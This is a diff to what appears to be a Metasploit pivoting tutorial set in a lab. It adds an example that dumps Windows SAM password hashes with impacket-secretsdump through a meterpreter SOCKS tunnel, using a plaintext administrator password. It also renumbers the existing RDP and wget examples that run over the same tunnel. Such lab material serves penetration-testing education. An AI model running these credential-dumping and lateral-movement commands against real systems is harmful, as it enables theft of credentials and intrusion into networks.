@@ -304,7 +304,25 @@ Webserver1
 C:\>exit
 
 
-Example 2 - RDP connection to the Windows server '192.168.1.196' over the meterpreter tunnel
+Example 2 - Remote credentials dumping using secretsdump (impacket) on the Windows server '192.168.1.196' over the meterpreter tunnel
+------------------------------------------------------------------------------------------------------------------------------------
+
+msf6 auxiliary(server/socks_proxy) > proxychains impacket-secretsdump administrator:Superpass2022@192.168.1.196
+[*] exec: proxychains impacket-secretsdump administrator:Superpass2022@192.168.1.196
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x804b281f0eff70cd58d31d71e1fe2989
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:413eb6b2b7676dcf83d35b<SNIP>
+<SNIP>
+
+
+Example 3 - RDP connection to the Windows server '192.168.1.196' over the meterpreter tunnel
 ----------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains xfreerdp /f /u:administrator /p:Superpass2022 /v:192.168.1.196
@@ -336,7 +354,7 @@ Do you trust the above certificate? (Y/T/N) y
 => The RDP connection works well.
 
 
-Example 3 - WGET request to a Web server (192.168.1.254) over the meterpreter tunnel
+Example 4 - WGET request to a Web server (192.168.1.254) over the meterpreter tunnel
 -----------------------------------------------------------------------------------------
 
 msf6 auxiliary(server/socks_proxy) > proxychains wget http://192.168.1.254
@@ -353,6 +371,4 @@ Saving to: ‘index.html’
 index.html                                     [ <=>                                                                                     ]   3.28K  --.-KB/s    in 0.04s
 
 2022-11-01 19:24:06 (92.4 KB/s) - ‘index.html’ saved [3357]
-
-
 
